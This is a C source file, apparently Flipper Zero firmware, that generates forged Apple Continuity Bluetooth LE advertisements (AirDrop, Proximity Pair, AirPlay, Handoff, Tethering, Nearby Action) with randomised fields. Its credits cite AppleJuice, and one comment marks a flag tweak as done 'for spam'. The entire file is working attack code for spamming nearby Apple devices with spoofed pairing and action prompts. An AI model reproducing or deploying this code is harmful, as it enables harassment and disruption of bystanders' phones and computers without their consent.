#include "continuity.h"
#include <furi_hal_random.h>

// Hacked together by @Willy-JL
// Custom adv logic by @Willy-JL and @xMasterX
// Extensive testing and research on behavior and parameters by @Willy-JL and @ECTO-1A
// Structures docs and Nearby Action IDs from https://github.com/furiousMAC/continuity/
// Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
// Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/

static const char* continuity_type_names[ContinuityTypeCount] = {
    [ContinuityTypeAirDrop] = "AirDrop",
    [ContinuityTypeProximityPair] = "Proximity Pair",
    [ContinuityTypeAirplayTarget] = "Airplay Target",
    [ContinuityTypeHandoff] = "Handoff",
    [ContinuityTypeTetheringSource] = "Tethering Source",
    [ContinuityTypeNearbyAction] = "Nearby Action",
};
const char* continuity_get_type_name(ContinuityType type) {
    return continuity_type_names[type];
}

static uint8_t continuity_packet_sizes[ContinuityTypeCount] = {
    [ContinuityTypeAirDrop] = 24,
    [ContinuityTypeProximityPair] = 31,
    [ContinuityTypeAirplayTarget] = 12,
    [ContinuityTypeHandoff] = 20,
    [ContinuityTypeTetheringSource] = 12,
    [ContinuityTypeNearbyAction] = 11,
};
uint8_t continuity_get_packet_size(ContinuityType type) {
    return continuity_packet_sizes[type];
}

void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
    uint8_t size = continuity_get_packet_size(msg->type);
    uint8_t i = 0;

    packet[i++] = size - 1; // Packet Length
    packet[i++] = 0xFF; // Packet Header
    packet[i++] = 0x4C; // ...
    packet[i++] = 0x00; // ...
    packet[i++] = msg->type; // Type
    packet[i] = size - i - 1; // Message Length
    i++;

    switch(msg->type) {
    case ContinuityTypeAirDrop:
        packet[i++] = 0x00; // Zeros
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // AppleID
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Phone Number
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email2
        packet[i++] = (rand() % 256); // ...
        packet[i++] = 0x00; // Zero
        break;

    case ContinuityTypeProximityPair:
        packet[i++] = msg->data.proximity_pair.prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
        packet[i++] = msg->data.proximity_pair.model >> 8;
        packet[i++] = msg->data.proximity_pair.model & 0xFF;
        packet[i++] = 0x55; // Status
        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charing Status and Battery Case Level
        packet[i++] = (rand() % 256); // Lid Open Counter
        packet[i++] = 0x00; // Device Color
        packet[i++] = 0x00;
        furi_hal_random_fill_buf(&packet[i], 16); // Encrypted Payload
        i += 16;
        break;

    case ContinuityTypeAirplayTarget:
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 256); // Configuration Seed
        packet[i++] = (rand() % 256); // IPv4 Address
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;

    case ContinuityTypeHandoff:
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Initialization Vector
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // AES-GCM Auth Tag
        packet[i++] = (rand() % 256); // Encrypted Payload
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;

    case ContinuityTypeTetheringSource:
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 101); // Battery Life
        packet[i++] = 0x00; // Cell Service Type
        packet[i++] = (rand() % 8); // ...
        packet[i++] = (rand() % 5); // Cell Service Strength
        break;

    case ContinuityTypeNearbyAction:
        packet[i] = msg->data.nearby_action.flags; // Action Flags
        if(packet[i] == 0xBF && rand() % 2) packet[i]++; // Ugly hack to shift 0xBF-0xC0 for spam
        i++;
        packet[i++] = msg->data.nearby_action.type;
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;
        break;

    default:
        break;
    }
}
